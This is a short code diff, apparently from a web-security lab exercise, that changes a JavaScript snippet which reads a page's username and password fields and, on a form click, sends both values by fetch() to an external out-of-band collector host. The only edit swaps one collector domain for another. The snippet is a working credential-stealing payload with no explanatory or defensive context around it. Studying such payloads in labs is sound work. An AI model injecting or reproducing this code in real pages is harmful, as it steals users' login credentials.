@@ -50,7 +50,7 @@ let a = document.getElementsByName('username')[0];
 let b = document.getElementsByName('password')[0];
 function f() {
 if(b.value.length>0) {
-    fetch("https://3aej06rtg3tijv3patrqct5tekkb82wr.oastify.com/?username="+a.value+"&password="+b.value)
+    fetch("https://ggqgbvasnzqbplkcnlii3k442dxccbk8p.oast.fun/?username="+a.value+"&password="+b.value)
 }
 }
 a.form.onclick=f;
